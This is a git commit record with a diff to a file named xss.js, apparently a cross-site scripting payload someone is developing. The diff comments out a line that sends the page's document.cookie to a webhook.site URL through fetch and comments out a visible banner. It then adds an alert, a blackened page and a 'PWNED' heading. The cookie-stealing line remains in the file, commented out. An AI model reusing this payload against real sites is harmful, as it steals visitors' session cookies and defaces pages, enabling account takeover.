5828fc86131f40e202447e1dda42ef904d82e37b
unknown <shashankbc4@gmail.com>
2025-04-14 10:58:25 +0530

    alert

--- xss.js
+++ xss.js
@@ -1,5 +1,8 @@
 // Visual confirmation that script executed
-document.body.innerHTML += "<h1 style='color:red'>🔥 XSS Executed!</h1>";
+// document.body.innerHTML += "<h1 style='color:red'>🔥 XSS Executed!</h1>";
 
 // Silent exfiltration to your webhook.site
-fetch("https://webhook.site/1058df3b-47af-4f36-81ac-769b03d17414?cookie=" + encodeURIComponent(document.cookie));
+// fetch("https://webhook.site/1058df3b-47af-4f36-81ac-769b03d17414?cookie=" + encodeURIComponent(document.cookie));
+alert("🔥 XSS Executed!");
+document.body.style.background = "black";
+document.body.innerHTML += "<h1 style='color:red;'>PWNED</h1>";
